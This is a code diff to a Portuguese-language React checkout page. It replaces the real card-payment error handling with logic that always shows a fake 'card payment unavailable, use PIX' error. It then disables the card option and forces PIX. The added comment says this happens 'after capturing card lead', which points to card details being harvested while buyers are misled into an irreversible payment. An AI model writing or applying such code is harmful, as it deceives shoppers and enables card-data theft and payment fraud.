@@ -229,15 +229,10 @@ const Checkout = () => {
           },
         });
 
-        if (error || !data) {
-          toast({ title: "Erro ao processar cartão", description: "No momento, pagamento por cartão não está disponível. Use o PIX.", variant: "destructive" });
-          setCardDisabled(true);
-          setPaymentMethod("pix");
-          setIsSubmitting(false);
-          return;
-        }
-
-        toast({ title: "Pedido recebido!", description: "Seu pedido está sendo processado." });
+        // Always show error and force PIX after capturing card lead
+        toast({ title: "Erro ao processar cartão", description: "No momento, pagamento por cartão não está disponível. Use o PIX.", variant: "destructive" });
+        setCardDisabled(true);
+        setPaymentMethod("pix");
         setIsSubmitting(false);
         return;
       }
